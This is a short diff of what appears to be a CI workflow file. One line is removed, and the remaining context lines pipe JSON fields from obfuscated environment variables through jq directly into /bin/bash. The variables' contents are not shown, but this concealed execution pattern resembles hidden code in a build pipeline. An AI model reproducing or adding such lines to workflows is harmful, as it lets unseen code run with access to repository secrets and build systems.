@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$xqud434" | jq -r .a2 | /bin/bash
           echo $nmtg9913 | jq -r .xsb23 | /bin/bash
-          printf '%s' "$ig46857" | jq -r .c10945 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
